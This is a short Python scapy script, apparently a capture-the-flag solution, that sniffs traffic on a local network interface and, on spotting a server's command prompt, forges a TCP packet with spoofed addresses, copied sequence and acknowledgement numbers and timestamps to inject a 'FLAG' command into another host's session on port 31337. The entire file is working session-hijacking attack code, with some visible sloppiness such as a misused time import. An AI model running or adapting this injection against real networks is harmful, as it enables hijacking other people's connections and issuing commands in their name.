#! /usr/bin/env python
from time import time
from scapy.all import *
done = False
elements=0
start = time.time()
val = 0
pkt = Ether()/IP()/TCP()/Raw()
pkt[Ether].type = 'IPv4'
		
				
pkt[IP].version = 4
pkt[IP].ihl = 5
pkt[IP].tos = 0x0
pkt[IP].len = 57
pkt[IP].flags = 'DF'
pkt[IP].frags = 0
pkt[IP].ttl = 63
pkt[IP].proto = 'tcp'
pkt[IP].chksum = None
pkt[IP].src = '10.0.0.4'
pkt[IP].dst = '10.0.0.3'
	
	
pkt[TCP].dport = 31337

pkt[TCP].dataofs = 8
pkt[TCP].reserved = 0
pkt[TCP].flags = 'PA'
pkt[TCP].window = 502
pkt[TCP].chksum = None
pkt[TCP].urgptr = 0
while not done:
	ack = 0
	seq = 0
	sniffed = sniff(iface='eth0', count=3)
	rpkt = sniffed[0]
	getter = sniffed[2]
	try:
		if rpkt[Raw].load == b'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n':
			fpkt = rpkt
			pkt[Ether].src = fpkt[Ether].dst
			pkt[Ether].dst = fpkt[Ether].src
			pktid = getter[IP].id + 1
			pkt[TCP].sport = fpkt[TCP].dport
			pkt[IP].id = pktid
			seq = getter[TCP].seq
			ack = getter[TCP].ack
			pkt[TCP].seq = seq
			pkt[TCP].ack = ack
			pkt[Raw].load = b'FLAG\n'
			ecr = getter[TCP].options[2][1][1]
			val = getter[TCP].options[2][1][0]
			
			pkt[TCP].options = [('NOP', None), ('NOP', None), ('Timestamp', (val, ecr))]

			builtPacket = Raw(pkt)
			sendp(pkt, iface='eth0')
			
			
		


	except IndexError:
		print('error')
	
